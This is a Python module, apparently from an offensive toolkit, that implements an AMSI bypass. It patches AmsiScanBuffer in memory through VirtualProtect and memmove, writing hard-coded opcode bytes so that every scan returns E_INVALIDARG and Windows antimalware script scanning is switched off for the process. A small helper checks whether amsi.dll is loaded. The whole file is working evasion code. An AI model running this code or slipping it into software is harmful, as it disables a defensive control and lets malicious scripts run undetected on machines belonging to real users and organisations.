#!/usr/bin/env python3
"""Evasion: AMSI bypass — patch AMSI in-memory to bypass script scanning."""
import ctypes
import sys
import platform

def patch():
    """Patch AmsiScanBuffer to return E_INVALIDARG.
    
    Patches the first bytes of AmsiScanBuffer with:
        xor edx, edx          ; 33 D2
        mov eax, 0x80070057   ; B8 57 00 07 80
        ret                   ; C3
    
    This causes AMSI to return E_INVALIDARG for all scan requests,
    effectively disabling AMSI-based detection for the current process.
    """
    if platform.system() != "Windows":
        return False

    try:
        from ctypes import wintypes
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)

        # Load amsi.dll
        h_amsi = k32.LoadLibraryA(b"amsi.dll")
        if not h_amsi:
            return False

        # Find AmsiScanBuffer
        scan_buffer = k32.GetProcAddress(h_amsi, b"AmsiScanBuffer")
        if not scan_buffer:
            return False

        # Patch bytes
        patch_bytes = b"\x33\xD2\xB8\x57\x00\x07\x80\xC3"

        # Change memory protection to RWX
        old_prot = wintypes.DWORD(0)
        if not k32.VirtualProtect(scan_buffer, len(patch_bytes),
                                  0x40,  # PAGE_EXECUTE_READWRITE
                                  ctypes.byref(old_prot)):
            return False

        # Write patch
        ctypes.memmove(scan_buffer, patch_bytes, len(patch_bytes))

        # Restore protection
        k32.VirtualProtect(scan_buffer, len(patch_bytes),
                          old_prot.value, ctypes.byref(old_prot))

        return True

    except Exception:
        return False

def check():
    """Check if AMSI is active."""
    if platform.system() != "Windows":
        return False
    try:
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        h = k32.LoadLibraryA(b"amsi.dll")
        return h != 0
    except:
        return False
